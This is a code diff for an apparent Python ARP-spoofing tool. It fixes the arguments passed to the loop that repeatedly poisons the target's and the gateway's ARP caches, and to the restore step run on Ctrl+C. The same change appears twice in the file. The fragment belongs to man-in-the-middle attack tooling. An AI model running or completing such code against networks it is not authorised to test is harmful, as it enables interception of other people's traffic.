@@ -63,6 +63,7 @@ def thread_delay(thread_name, delay, ip):
 	elif args.arp:
 		try:
 			gtw = ipaddress.ip_address(args.arp)
+			print('%s is a correct IP%s address.' % (gtw, gtw.version))
 		except:
 			print('Address/netmask is invalid: %s' % args.arp)
 			exit(1)
@@ -72,14 +73,14 @@ def thread_delay(thread_name, delay, ip):
 		try:
 			while True:
 				#telling the target that we are the host
-				spoof(ip, host, verbose)
+				spoof(args.ip, args.arp, verbose)
 				#telling the host that we are the target
-				spoof(host, ip, verbose)
+				spoof(args.arp, args.ip, verbose)
 				time.sleep(1)
 		except KeyboardInterrupt:
 			print("[!] Detected CTRL+C ! restoring the network, please wait...")
-			restore(target, host)
-			restore(host, target)
+			restore(args.ip, args.arp)
+			restore(args.arp, args.ip)
 		
 	else:
 		print("No option selected.")
@@ -183,6 +184,7 @@ if args.ip:
 	elif args.arp:
 		try:
 			gtw = ipaddress.ip_address(args.arp)
+			print('%s is a correct IP%s address.' % (gtw, gtw.version))
 		except:
 			print('Address/netmask is invalid: %s' % args.arp)
 			exit(1)
@@ -192,14 +194,14 @@ if args.ip:
 		try:
 			while True:
 				#telling the target that we are the host
-				spoof(ip, host, verbose)
+				spoof(args.ip, args.arp, verbose)
 				#telling the host that we are the target
-				spoof(host, ip, verbose)
+				spoof(args.arp, args.ip, verbose)
 				time.sleep(1)
 		except KeyboardInterrupt:
 			print("[!] Detected CTRL+C ! restoring the network, please wait...")
-			restore(target, host)
-			restore(host, target)
+			restore(args.ip, args.arp)
+			restore(args.arp, args.ip)
 		
 	else:
 		print("No option selected.")
